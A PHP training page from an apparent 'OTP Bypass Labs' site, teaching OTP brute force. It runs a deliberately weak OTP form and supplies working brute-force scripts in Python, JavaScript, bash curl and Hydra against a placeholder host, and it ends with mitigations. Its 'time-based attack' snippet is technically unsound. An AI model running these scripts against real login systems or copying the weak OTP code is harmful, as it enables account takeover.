<?php
// Lab 2: OTP Brute Force
// Vulnerability: OTP brute force attacks

session_start();

$message = '';
$otp_sent = false;
$otp_verified = false;
$attempts = $_SESSION['otp_attempts'] ?? 0;
$max_attempts = 10; // Simulate rate limiting

// Simulate OTP generation and verification
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $action = $_POST['action'] ?? '';
    
    if ($action === 'send_otp') {
        $phone = $_POST['phone'] ?? '';
        $email = $_POST['email'] ?? '';
        
        if (!empty($phone) || !empty($email)) {
            // Generate a simple 6-digit OTP
            $otp = str_pad(rand(0, 999999), 6, '0', STR_PAD_LEFT);
            $_SESSION['otp'] = $otp;
            $_SESSION['otp_time'] = time();
            $_SESSION['phone'] = $phone;
            $_SESSION['email'] = $email;
            $_SESSION['otp_attempts'] = 0; // Reset attempts
            $otp_sent = true;
            $message = '<div class="alert alert-success">✅ OTP sent successfully! Check your phone/email.</div>';
        } else {
            $message = '<div class="alert alert-danger">❌ Please provide phone number or email.</div>';
        }
    } elseif ($action === 'verify_otp') {
        $entered_otp = $_POST['otp'] ?? '';
        $stored_otp = $_SESSION['otp'] ?? '';
        
        if (!empty($entered_otp) && !empty($stored_otp)) {
            // Check if OTP is expired (5 minutes)
            if (time() - $_SESSION['otp_time'] > 300) {
                $message = '<div class="alert alert-danger">❌ OTP has expired. Please request a new one.</div>';
            } elseif ($attempts >= $max_attempts) {
                $message = '<div class="alert alert-danger">❌ Too many attempts. Please try again later.</div>';
            } elseif ($entered_otp === $stored_otp) {
                $otp_verified = true;
                $message = '<div class="alert alert-success">✅ OTP verified successfully! Access granted.</div>';
            } else {
                $_SESSION['otp_attempts'] = $attempts + 1;
                $message = '<div class="alert alert-danger">❌ Invalid OTP. Attempts: ' . ($attempts + 1) . '/' . $max_attempts . '</div>';
            }
        } else {
            $message = '<div class="alert alert-danger">❌ Please enter the OTP.</div>';
        }
    }
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Lab 2: OTP Brute Force - OTP Bypass Labs</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.9.1/font/bootstrap-icons.css">
    
    <style>
        :root {
            --primary-dark: #1a1f36;
            --accent-green: #48bb78;
            --accent-blue: #4299e1;
            --accent-orange: #ed8936;
            --accent-red: #f56565;
        }
        
        body {
            background: linear-gradient(135deg, #0f172a 0%, #1e293b 100%);
            color: #e2e8f0;
            min-height: 100vh;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }

        .navbar-brand {
            font-weight: 700;
            font-size: 1.5rem;
            color: var(--accent-green) !important;
        }

        .nav-link {
            font-weight: 500;
            transition: color 0.3s;
        }

        .nav-link:hover {
            color: var(--accent-green) !important;
        }

        .hero-section {
            background: linear-gradient(rgba(15, 23, 42, 0.9), rgba(15, 23, 42, 0.9)), 
                        url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100" viewBox="0 0 100 100"><rect width="100" height="100" fill="%231e293b"/><path d="M0 0L100 100M100 0L0 100" stroke="%23374151" stroke-width="1"/></svg>');
            padding: 2rem 0;
            border-bottom: 1px solid #2d3748;
            margin-bottom: 2rem;
        }

        .hero-title {
            font-size: 2rem;
            font-weight: 700;
            background: linear-gradient(90deg, #48bb78, #4299e1);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            margin-bottom: 0.5rem;
        }

        .hero-subtitle {
            font-size: 1rem;
            color: #cbd5e0;
        }

        .section-title {
            margin-top: 30px;
            margin-bottom: 20px;
            font-weight: 700;
            font-size: 1.5rem;
            position: relative;
            padding-bottom: 10px;
        }

        .section-title::after {
            content: '';
            position: absolute;
            bottom: 0;
            left: 0;
            width: 60px;
            height: 4px;
            background: linear-gradient(90deg, var(--accent-green), var(--accent-blue));
            border-radius: 2px;
        }

        .card {
            background: rgba(30, 41, 59, 0.7);
            border-radius: 12px;
            border: 1px solid #334155;
            color: #e2e8f0;
        }

        .card-header {
            background: rgba(15, 23, 42, 0.5);
            border-bottom: 1px solid #334155;
            font-weight: 600;
            padding: 1rem 1.5rem;
        }

        .form-control, .form-select {
            background: rgba(30, 41, 59, 0.7);
            border: 1px solid #334155;
            color: #e2e8f0;
            padding: 0.75rem 1rem;
        }

        .form-control:focus, .form-select:focus {
            background: rgba(30, 41, 59, 0.9);
            border-color: var(--accent-green);
            box-shadow: 0 0 0 0.2rem rgba(72, 187, 120, 0.25);
            color: #e2e8f0;
        }

        .form-label {
            font-weight: 500;
            color: #cbd5e0;
        }

        .btn-primary {
            background: linear-gradient(90deg, var(--accent-green), var(--accent-blue));
            border: none;
            padding: 0.75rem 1.5rem;
            font-weight: 600;
            transition: all 0.3s;
        }

        .btn-primary:hover {
            transform: translateY(-2px);
            box-shadow: 0 4px 12px rgba(72, 187, 120, 0.3);
        }

        .vulnerability-info {
            background: rgba(30, 41, 59, 0.7);
            border-radius: 12px;
            border: 1px solid #334155;
            padding: 1.5rem;
            margin-bottom: 2rem;
            border-left: 4px solid var(--accent-orange);
        }

        .payload-examples {
            background: rgba(30, 41, 59, 0.7);
            border-radius: 12px;
            border: 1px solid #334155;
            padding: 1.5rem;
            margin-bottom: 2rem;
            border-left: 4px solid var(--accent-blue);
        }

        .danger-zone {
            background: rgba(30, 41, 59, 0.7);
            border-radius: 12px;
            border: 1px solid #334155;
            padding: 1.5rem;
            margin-bottom: 2rem;
            border-left: 4px solid var(--accent-red);
        }

        pre {
            background: rgba(15, 23, 42, 0.7);
            border-radius: 8px;
            padding: 1.5rem;
            color: #e2e8f0;
            border: 1px solid #334155;
            overflow-x: auto;
        }

        .lab-info {
            background: rgba(30, 41, 59, 0.7);
            border-radius: 12px;
            border: 1px solid #334155;
            padding: 1.5rem;
            margin-bottom: 2rem;
        }

        .lab-badge {
            background: linear-gradient(90deg, var(--accent-green), var(--accent-blue));
            color: #1a202c;
            font-weight: 600;
            padding: 0.5rem 1rem;
            border-radius: 6px;
            display: inline-block;
            margin-bottom: 1rem;
        }

        .result-display {
            background: rgba(15, 23, 42, 0.7);
            border-radius: 8px;
            padding: 1.5rem;
            margin: 1rem 0;
            border-left: 4px solid var(--accent-green);
        }

        .test-urls {
            background: rgba(15, 23, 42, 0.7);
            border-radius: 8px;
            padding: 1rem;
            margin-bottom: 1rem;
            border-left: 4px solid var(--accent-blue);
        }

        .input-info {
            background: rgba(15, 23, 42, 0.5);
            border-radius: 8px;
            padding: 1rem;
            margin: 0.5rem 0;
        }

        .sensitive-data {
            background: rgba(15, 23, 42, 0.5);
            border-radius: 8px;
            padding: 1rem;
            margin: 0.5rem 0;
            border-left: 4px solid var(--accent-red);
        }

        .code-block {
            background: rgba(15, 23, 42, 0.7);
            border-radius: 8px;
            padding: 1rem;
            margin: 0.5rem 0;
            border-left: 4px solid var(--accent-blue);
            font-family: 'Courier New', monospace;
            white-space: pre-wrap;
        }

        .brute-force-warning {
            background: rgba(15, 23, 42, 0.5);
            border-radius: 8px;
            padding: 1rem;
            margin: 0.5rem 0;
            border-left: 4px solid var(--accent-orange);
        }

        .vulnerable-form {
            background: rgba(30, 41, 59, 0.7);
            border-radius: 8px;
            padding: 1.5rem;
            margin: 1rem 0;
            border: 1px solid #334155;
        }

        .otp-display {
            background: rgba(15, 23, 42, 0.7);
            border-radius: 8px;
            padding: 1.5rem;
            margin: 1rem 0;
            border: 1px solid #334155;
        }

        .otp-code {
            font-family: 'Courier New', monospace;
            font-size: 2rem;
            font-weight: bold;
            color: var(--accent-green);
            text-align: center;
            letter-spacing: 0.5rem;
        }

        .brute-force-techniques {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
            gap: 1rem;
            margin: 1rem 0;
        }

        .technique-card {
            background: rgba(15, 23, 42, 0.7);
            border-radius: 8px;
            padding: 1rem;
            border: 1px solid #334155;
        }

        .technique-title {
            color: var(--accent-green);
            font-weight: 600;
            margin-bottom: 0.5rem;
        }

        .technique-demo {
            background: rgba(30, 41, 59, 0.7);
            border-radius: 4px;
            padding: 0.5rem;
            margin: 0.5rem 0;
            font-family: 'Courier New', monospace;
            font-size: 12px;
        }

        .attempt-counter {
            background: rgba(15, 23, 42, 0.7);
            border-radius: 8px;
            padding: 1rem;
            margin: 1rem 0;
            border-left: 4px solid var(--accent-red);
        }
    </style>
</head>
<body>
    <nav class="navbar navbar-expand-md navbar-dark sticky-top" style="background-color: var(--primary-dark);">
        <div class="container-fluid">
            <a class="navbar-brand" href="index.php">
                <i class="bi bi-arrow-left me-2"></i>Back to OTP Bypass Labs
            </a>
            <button class="navbar-toggler" type="button" data-bs-toggle="collapse"
                data-bs-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false"
                aria-label="Toggle navigation">
                <span class="navbar-toggler-icon"></span>
            </button>

            <div class="collapse navbar-collapse" id="navbarSupportedContent">
                <ul class="navbar-nav me-auto mb-2 mb-lg-0">
                    <li class="nav-item">
                        <a class="nav-link active" href="../about">About</a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link active" href="../contact">Contact Us</a>
                    </li>
                </ul>
            </div>
        </div>
    </nav>

    <div class="hero-section">
        <div class="container">
            <h1 class="hero-title">Lab 2: OTP Brute Force</h1>
            <p class="hero-subtitle">OTP brute force attacks</p>
        </div>
    </div>

    <div class="container mb-5">
        <div class="lab-info">
            <span class="lab-badge">Difficulty: Medium</span>
            <h3 class="section-title">Lab Overview</h3>
            <p>This lab demonstrates OTP brute force vulnerabilities where attackers can systematically guess OTP codes through automated attacks, exploiting weak rate limiting and predictable OTP generation.</p>
            <p><strong>Objective:</strong> Understand how OTP brute force attacks work and how to exploit them.</p>
        </div>

        <div class="row">
            <div class="col-lg-6">
                <div class="card mb-4">
                    <div class="card-header text-center">
                        <i class="bi bi-code-slash me-2"></i>Vulnerable OTP System
                    </div>
                    <div class="card-body">
                        <div class="vulnerable-form">
                            <h5>Two-Factor Authentication</h5>
                            <p>This system uses OTP for two-factor authentication. Try to brute force the OTP:</p>
                            
                            <?php if (!$otp_sent): ?>
                            <form method="POST">
                                <input type="hidden" name="action" value="send_otp">
                                <div class="mb-3">
                                    <label for="phone" class="form-label">Phone Number</label>
                                    <input type="tel" class="form-control" id="phone" name="phone" placeholder="+1234567890">
                                </div>
                                <div class="mb-3">
                                    <label for="email" class="form-label">Email Address</label>
                                    <input type="email" class="form-control" id="email" name="email" placeholder="user@example.com">
                                </div>
                                <button type="submit" class="btn btn-primary">Send OTP</button>
                            </form>
                            <?php else: ?>
                            <form method="POST">
                                <input type="hidden" name="action" value="verify_otp">
                                <div class="mb-3">
                                    <label for="otp" class="form-label">Enter OTP</label>
                                    <input type="text" class="form-control" id="otp" name="otp" placeholder="123456" maxlength="6">
                                </div>
                                <button type="submit" class="btn btn-primary">Verify OTP</button>
                            </form>
                            <?php endif; ?>
                            
                            <?php echo $message; ?>
                        </div>
                    </div>
                </div>
            </div>
            
            <div class="col-lg-6">
                <div class="card">
                    <div class="card-header">
                        <i class="bi bi-hammer me-2"></i>Brute Force Tester
                    </div>
                    <div class="card-body">
                        <div class="brute-force-warning">
                            <h5>⚠️ Brute Force Warning</h5>
                            <p>This lab demonstrates OTP brute force vulnerabilities:</p>
                            <ul>
                                <li><code>Weak Rate Limiting</code> - Insufficient attempt limits</li>
                                <li><code>Predictable OTP</code> - Weak OTP generation</li>
                                <li><code>No Account Lockout</code> - No account protection</li>
                                <li><code>No CAPTCHA</code> - No bot protection</li>
                            </ul>
                        </div>
                        
                        <div class="input-info">
                            <h5>Brute Force Techniques</h5>
                            <p>These techniques can be used for OTP brute force:</p>
                            <ul>
                                <li><code>Sequential Guessing</code> - Try OTPs in order</li>
                                <li><code>Common Patterns</code> - Try common OTP patterns</li>
                                <li><code>Automated Tools</code> - Use brute force tools</li>
                                <li><code>Distributed Attacks</code> - Use multiple IPs</li>
                            </ul>
                        </div>
                        
                        <div class="mt-3">
                            <button onclick="testBruteForce()" class="btn btn-primary">Test Brute Force</button>
                        </div>
                    </div>
                </div>
            </div>
        </div>

        <?php if ($otp_sent && !$otp_verified): ?>
        <div class="row mt-4">
            <div class="col-12">
                <div class="card">
                    <div class="card-header">
                        <i class="bi bi-code-square me-2"></i>OTP Display (For Testing)
                    </div>
                    <div class="card-body">
                        <div class="otp-display">
                            <h5>Generated OTP (For Testing Only):</h5>
                            <div class="otp-code"><?php echo $_SESSION['otp'] ?? 'N/A'; ?></div>
                            <small class="text-muted">This OTP is displayed for testing purposes only. In real-world scenarios, this would be sent via SMS/email.</small>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <?php endif; ?>

        <?php if ($otp_sent): ?>
        <div class="row mt-4">
            <div class="col-12">
                <div class="card">
                    <div class="card-header">
                        <i class="bi bi-code-square me-2"></i>Attempt Counter
                    </div>
                    <div class="card-body">
                        <div class="attempt-counter">
                            <h5>Brute Force Attempts:</h5>
                            <div class="progress mb-3">
                                <div class="progress-bar bg-danger" role="progressbar" style="width: <?php echo ($attempts / $max_attempts) * 100; ?>%">
                                    <?php echo $attempts; ?>/<?php echo $max_attempts; ?>
                                </div>
                            </div>
                            <small class="text-muted">Attempts remaining: <?php echo $max_attempts - $attempts; ?></small>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <?php endif; ?>

        <div class="row mt-4">
            <div class="col-12">
                <div class="card">
                    <div class="card-header">
                        <i class="bi bi-code-square me-2"></i>Brute Force Techniques
                    </div>
                    <div class="card-body">
                        <div class="brute-force-techniques">
                            <div class="technique-card">
                                <div class="technique-title">Sequential Brute Force</div>
                                <div class="technique-demo">// Try OTPs sequentially
for (let i = 0; i < 1000000; i++) {
    const otp = i.toString().padStart(6, '0');
    // Send OTP verification request
}</div>
                            </div>
                            
                            <div class="technique-card">
                                <div class="technique-title">Common Patterns</div>
                                <div class="technique-demo">// Try common OTP patterns
const commonOTPs = [
    '000000', '111111', '123456',
    '654321', '123123', '000001',
    '999999', '888888', '777777'
];</div>
                            </div>
                            
                            <div class="technique-card">
                                <div class="technique-title">Time-based Attack</div>
                                <div class="technique-demo">// Try OTPs based on time
const now = new Date();
const timeOTP = now.getTime().toString().slice(-6);
// Use time-based OTP generation</div>
                            </div>
                            
                            <div class="technique-card">
                                <div class="technique-title">Distributed Attack</div>
                                <div class="technique-demo">// Use multiple IPs/proxies
const proxies = ['proxy1.com', 'proxy2.com'];
// Distribute brute force across proxies</div>
                            </div>
                            
                            <div class="technique-card">
                                <div class="technique-title">Automated Tools</div>
                                <div class="technique-demo">// Use tools like Hydra, Burp Suite
hydra -l user -P wordlist.txt
  -f -t 10 target.com http-post-form
  "/verify:otp=^PASS^:Invalid"</div>
                            </div>
                            
                            <div class="technique-card">
                                <div class="technique-title">Parallel Requests</div>
                                <div class="technique-demo">// Send multiple requests in parallel
const promises = [];
for (let i = 0; i < 100; i++) {
    promises.push(sendOTPRequest(i));
}
await Promise.all(promises);</div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>

        <div class="row mt-4">
            <div class="col-md-6">
                <div class="vulnerability-info">
                    <h5><i class="bi bi-bug me-2"></i>Vulnerability Details</h5>
                    <ul>
                        <li><strong>Type:</strong> OTP Brute Force</li>
                        <li><strong>Severity:</strong> Medium</li>
                        <li><strong>Method:</strong> Automated guessing</li>
                        <li><strong>Issue:</strong> Weak rate limiting</li>
                    </ul>
                </div>
            </div>
            
            <div class="col-md-6">
                <div class="payload-examples">
                    <h5><i class="bi bi-target me-2"></i>Attack Vectors</h5>
                    <ul>
                        <li><strong>Sequential Guessing:</strong> Try OTPs in order</li>
                        <li><strong>Common Patterns:</strong> Try common OTP patterns</li>
                        <li><strong>Automated Tools:</strong> Use brute force tools</li>
                        <li><strong>Distributed Attacks:</strong> Use multiple IPs</li>
                    </ul>
                </div>
            </div>
        </div>

        <div class="test-urls">
            <h5><i class="bi bi-link me-2"></i>OTP Brute Force Examples</h5>
            <p>Use these techniques to exploit OTP brute force vulnerabilities:</p>
            
            <h6>1. Python Brute Force Script:</h6>
            <div class="code-block">import requests
import time

def brute_force_otp():
    base_url = "http://vulnerable-site.com/verify_otp"
    
    for i in range(1000000):
        otp = str(i).zfill(6)
        data = {"otp": otp}
        
        response = requests.post(base_url, data=data)
        
        if "success" in response.text:
            print(f"OTP found: {otp}")
            break
        
        time.sleep(0.1)  # Rate limiting

brute_force_otp()</div>

            <h6>2. JavaScript Brute Force:</h6>
            <div class="code-block">async function bruteForceOTP() {
    const baseUrl = 'http://vulnerable-site.com/verify_otp';
    
    for (let i = 0; i < 1000000; i++) {
        const otp = i.toString().padStart(6, '0');
        
        try {
            const response = await fetch(baseUrl, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({otp: otp})
            });
            
            const result = await response.json();
            
            if (result.success) {
                console.log(`OTP found: ${otp}`);
                break;
            }
        } catch (error) {
            console.error('Error:', error);
        }
        
        await new Promise(resolve => setTimeout(resolve, 100));
    }
}

bruteForceOTP();</div>

            <h6>3. cURL Brute Force:</h6>
            <div class="code-block">#!/bin/bash

for i in {0..999999}; do
    otp=$(printf "%06d" $i)
    
    response=$(curl -s -X POST http://vulnerable-site.com/verify_otp \
        -d "otp=$otp")
    
    if echo "$response" | grep -q "success"; then
        echo "OTP found: $otp"
        break
    fi
    
    sleep 0.1
done</div>

            <h6>4. Burp Suite Intruder:</h6>
            <div class="code-block">// Burp Suite Intruder payload
// Payload type: Numbers
// From: 0
// To: 999999
// Step: 1
// Min integer digits: 6
// Max integer digits: 6

// Attack type: Sniper
// Target: otp parameter</div>

            <h6>5. Hydra Brute Force:</h6>
            <div class="code-block"># Generate OTP wordlist
python3 -c "
for i in range(1000000):
    print(f'{i:06d}')
" > otp_wordlist.txt

# Use Hydra for brute force
hydra -l user -P otp_wordlist.txt
  -f -t 10 target.com http-post-form
  "/verify:otp=^PASS^:Invalid"</div>

            <h6>6. Common OTP Patterns:</h6>
            <div class="code-block">const commonPatterns = [
    '000000', '111111', '222222', '333333',
    '444444', '555555', '666666', '777777',
    '888888', '999999', '123456', '654321',
    '123123', '456789', '987654', '000001',
    '123321', '456654', '789987', '111222'
];</div>

            <h6>7. Time-based OTP Attack:</h6>
            <div class="code-block">// Try OTPs based on current time
const now = new Date();
const timeOTP = now.getTime().toString().slice(-6);

// Try variations around current time
for (let i = -1000; i <= 1000; i++) {
    const time = new Date(now.getTime() + i);
    const otp = time.getTime().toString().slice(-6);
    // Send OTP verification request
}</div>

            <h6>8. Distributed Brute Force:</h6>
            <div class="code-block">// Use multiple proxies for distributed attack
const proxies = [
    'proxy1.example.com:8080',
    'proxy2.example.com:8080',
    'proxy3.example.com:8080'
];

// Distribute OTP range across proxies
const otpRange = 1000000;
const otpsPerProxy = Math.floor(otpRange / proxies.length);

proxies.forEach((proxy, index) => {
    const start = index * otpsPerProxy;
    const end = start + otpsPerProxy;
    // Start brute force with this proxy
});</div>

            <h6>9. Parallel Brute Force:</h6>
            <div class="code-block">// Send multiple requests in parallel
async function parallelBruteForce() {
    const promises = [];
    const batchSize = 100;
    
    for (let i = 0; i < 1000000; i += batchSize) {
        const batch = [];
        
        for (let j = i; j < i + batchSize; j++) {
            const otp = j.toString().padStart(6, '0');
            batch.push(sendOTPRequest(otp));
        }
        
        promises.push(Promise.all(batch));
    }
    
    await Promise.all(promises);
}</div>

            <h6>10. Smart Brute Force:</h6>
            <div class="code-block">// Smart brute force with response analysis
function smartBruteForce() {
    const responses = [];
    
    for (let i = 0; i < 1000; i++) {
        const otp = i.toString().padStart(6, '0');
        const response = sendOTPRequest(otp);
        
        responses.push({
            otp: otp,
            response: response,
            time: response.time
        });
    }
    
    // Analyze responses for patterns
    const validOTP = responses.find(r => r.response.success);
    return validOTP;
}</div>
        </div>

        <div class="danger-zone">
            <h5><i class="bi bi-exclamation-triangle me-2"></i>Real-World Attack Scenarios</h5>
            <ul>
                <li>Account takeover through OTP brute force</li>
                <li>Financial fraud and payment manipulation</li>
                <li>Authentication bypass and privilege escalation</li>
                <li>Compliance violations and security breaches</li>
                <li>Cross-site attacks and data exfiltration</li>
                <li>Automated account compromise</li>
            </ul>
        </div>

        <div class="card mt-4">
            <div class="card-header">
                <i class="bi bi-lightbulb me-2"></i>Mitigation Strategies
            </div>
            <div class="card-body">
                <ul>
                    <li>Implement strong rate limiting and throttling</li>
                    <li>Use secure OTP generation with sufficient entropy</li>
                    <li>Implement account lockout after failed attempts</li>
                    <li>Use CAPTCHA to prevent automated attacks</li>
                    <li>Regular security testing and vulnerability assessments</li>
                    <li>Monitor for unusual authentication patterns</li>
                    <li>Implement proper authentication and authorization</li>
                    <li>Use secure coding practices</li>
                    <li>Implement proper error handling</li>
                    <li>Educate users about OTP security</li>
                    <li>Use multi-factor authentication</li>
                    <li>Implement proper logging and monitoring</li>
                    <li>Use IP-based rate limiting</li>
                    <li>Implement progressive delays</li>
                </ul>
            </div>
        </div>
    </div>

    <script>
        function testBruteForce() {
            alert('Brute Force test initiated. Try the brute force techniques above.');
        }
    </script>

    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.0/dist/js/bootstrap.bundle.min.js"></script>
</body>
</html>
